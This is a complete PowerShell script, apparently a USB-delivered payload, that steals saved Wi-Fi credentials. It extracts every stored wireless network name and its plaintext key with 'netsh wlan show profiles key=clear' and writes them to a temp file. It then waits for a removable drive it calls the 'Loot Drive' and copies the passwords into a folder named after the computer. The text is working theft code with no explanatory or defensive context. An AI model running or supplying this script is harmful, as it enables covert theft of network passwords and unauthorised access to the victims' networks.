Clear-Host
$outfile = ""; $a = 0; $ws = (netsh wlan show profiles) -replace ".*:\s+"; foreach ($s in $ws) { if ($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5) { $ssid = $s.Trim(); if ($s -Match ":") { $ssid = $s.Split(":")[1].Trim() } $pw = (netsh wlan show profiles name=$ssid key=clear); $pass = "None"; foreach ($p in $pw) { if ($p -Match "Key Content") { $pass = $p.Split(":")[1].Trim(); $outfile += "SSID: $ssid : Password: $pass`n" } } }$a++; }; $outfile | Out-File -FilePath "$env:temp\info.txt" -Encoding ASCII -Force ; $Pathsys = "$env:temp\info.txt";
$removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
$count = $removableDrives.count
Write-Host "Connect a Device." 

While ($count -eq $removableDrives.count) {
  $removableDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
  sleep -Milliseconds 500
}

$drive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object -Descending | Select-Object -First 1
$driveLetter = $drive.DeviceID
Write-Host "Loot Drive Set To : $driveLetter/"

$destinationPath = "$driveLetter\$env:COMPUTERNAME`_Wifi"

if (-not (Test-Path -Path $destinationPath)) {
  New-Item -ItemType Directory -Path $destinationPath -Force
  Write-Host "New Folder Created : $destinationPath"
}

Copy-Item $Pathsys $destinationPath
exit